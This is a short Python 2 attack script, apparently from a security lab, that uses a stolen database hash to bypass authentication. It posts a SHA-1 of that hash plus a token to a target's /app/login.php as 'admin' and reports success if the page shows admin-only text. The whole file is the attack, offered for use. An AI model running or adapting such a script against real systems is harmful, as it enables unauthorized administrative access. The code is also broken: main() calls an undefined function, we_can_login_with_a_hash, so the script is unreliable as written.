import sys, hashlib, requests

def gen_hash(passwd, token):
    sha_1 = hashlib.sha1()
    sha_1.update(passwd + token)
    return sha_1.hexdigest()
    
def login_with_a_hash():
    target = "http://%s/app/login.php" % sys.argv[1]
    token = "something"
    hashed = gen_hash(sys.argv[2], token)
    d = {
    "password_hidden" : hashed,
    "login": "admin",
    "submit": "Login",
    "token" : token
    }
    s = requests.Session()
    r = s.post(target, data=d)
    res = r.text
    if "Welcome Human" in res or "Add New Account" in res or "Order Widgets" in res:
        return True
    return False

def main():
    if len(sys.argv) != 3:
        print "(+) This script assumes you have gained access to a sensitive hash from the database related to the authentication process. Lets use it bypass the authentication proccess" 
        print "(+) usage: %s <target> <hash>" % sys.argv[0]
        print "(+) eg: %s 10.168.1.123 56b11a061cc" % sys.argv[0]
        sys.exit(-1)
    if we_can_login_with_a_hash():
        print "(+) success!"
    else:
        print "(-) failure!"

if __name__ == "__main__":
    main()
